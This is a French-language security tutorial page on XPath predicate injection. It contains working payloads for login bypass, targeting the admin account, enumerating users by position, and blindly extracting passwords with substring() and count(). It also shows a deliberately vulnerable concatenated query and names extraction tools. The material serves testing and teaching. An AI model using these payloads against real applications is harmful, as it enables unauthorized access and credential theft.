---
order: 1
title: "Injection de prédicat XPath"
description: "S'échapper d'un littéral de chaîne à l'intérieur d'un prédicat XPath réécrit la condition du filtre pour le contournement d'authentification et l'extraction de nœud à l'aide de logique booléenne et de fonctions de position."
keywords:
  - injection de prédicat XPath
  - contournement d'authentification XPath
  - or 1=1 XPath
  - fonction position
  - contournement de connexion XML
---

# Injection de prédicat

Un prédicat est le filtre entre crochets d'une étape de localisation XPath, `//user[name='x' and pass='y']`, et c'est là qu'atterrit la majeure partie de l'injection XPath. Lorsque l'entrée utilisateur est concaténée dans le prédicat, fermer le littéral de chaîne permet à un attaquant de réécrire la condition qui décide quels nœuds correspondent.

## Casser le littéral

La requête assemble un prédicat autour d'une valeur entre guillemets :

```python
expr = "//user[name='" + username + "' and pass='" + password + "']"
```

Fournir un simple guillemet dans `username` termine le littéral prématurément et laisse le reste de l'expression sous le contrôle de l'attaquant. La précédence des opérateurs décide de la charge utile : `and` lie plus fortement que `or`, donc un simple `or '1'='1` en fin n'est pas suffisant. Cela se parse comme `name='' or ('1'='1' and pass='anything')`, ce qui exige toujours que le mot de passe soit égal à `anything`. La charge utile toujours-vraie fiable ajoute une seconde clause `or` autonome qui domine tout le prédicat :

```
username: ' or '1'='1' or '1'='1
password: anything
```

L'expression devient `//user[name='' or '1'='1' or '1'='1' and pass='anything']`. Le `'1'='1'` du milieu est un opérande `or` de premier niveau, donc le prédicat est vrai peu importe ce à quoi s'évaluent le nom ou la clause de mot de passe en fin, et le premier nœud utilisateur correspond.

Pour se lier à un compte spécifique plutôt qu'à celui qui se classe en premier, gardez le littéral du nom d'utilisateur pour que sa clause `name` reste appliquée, et injectez dans le mot de passe pour qu'un nouveau test de `name` domine :

```
username: admin
password: x' or name='admin
```

Cela donne `//user[name='admin' and pass='x' or name='admin']`. La précédence le regroupe comme `(name='admin' and pass='x') or name='admin'`, donc le nœud admin correspond quel que soit son mot de passe, et aucun autre nœud ne correspond.

## Sélectionner par position

Quand la correspondance renvoie le premier nœud et que le but est un enregistrement particulier, `position()` et l'indexation de nœud parcourent le jeu de résultats. Cela importe quand le premier utilisateur n'est pas celui que vous voulez :

```
' or position()=2 or '1'='1
```

Combiné au formulaire de connexion, cela authentifie en tant que deuxième nœud `user` dans l'ordre du document. Itérer l'indice énumère les comptes un par un.

## Le commentaire est rarement nécessaire

XPath 1.0 n'a pas de jeton de commentaire en ligne, donc contrairement à SQL il n'y a pas de `--` pour écarter la fin de l'expression. L'injection doit à la place équilibrer la syntaxe environnante. L'approche fiable est d'ajouter des clauses qui rendent valides le guillemet et le crochet de fin, c'est pourquoi le motif `' or 'a'='a`, qui laisse une chaîne bien formée, est préféré à une tentative de tronquer.

## Extraire des nœuds via le prédicat

Au-delà du contournement, le prédicat est un oracle. Des conditions booléennes référençant d'autres parties de l'arbre confirment la structure et les valeurs. Ce qui suit ne renvoie un nœud que si un enfant `password` du premier utilisateur commence par `s` :

```
' or substring(//user[1]/pass,1,1)='s' or '1'='1
```

Une réponse correspondante (connexion réussie, ou enregistrement renvoyé) confirme le caractère deviné ; itérer l'indice et le jeu de caractères récupère la valeur complète. La même technique lit tout nœud accessible depuis la racine du document, pas seulement le sous-arbre d'authentification :

```
' or substring(//user[position()=1]/@role,1,1)='a' or '1'='1
```

`count()` fixe les bornes avant l'extraction pour que le parcours caractère par caractère sache jusqu'où aller :

```
' or count(//user)=5 or '1'='1
' or string-length(//user[1]/pass)=12 or '1'='1
```

## Contextes numériques et sans guillemets

Là où l'entrée atterrit dans un prédicat numérique sans guillemets environnants, aucune rupture de littéral n'est nécessaire ; injectez la logique directement :

```
//product[id=1 or 1=1]
```

charge utile : `1 or 1=1`.

## Outils

- **xcat** : automatisation de l'extraction de nœud basée sur le booléen via le prédicat.
- **Burp Intruder** : itération de charges utiles de prédicat booléennes pour l'extraction aveugle.
- Tests manuels avec des charges utiles de tautologie `or` et `substring()`.

## Références

- [OWASP: XPATH Injection](https://owasp.org/www-community/attacks/XPATH_Injection)
- [OWASP WSTG: Testing for XPath Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection)
- [PayloadsAllTheThings: XPATH Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
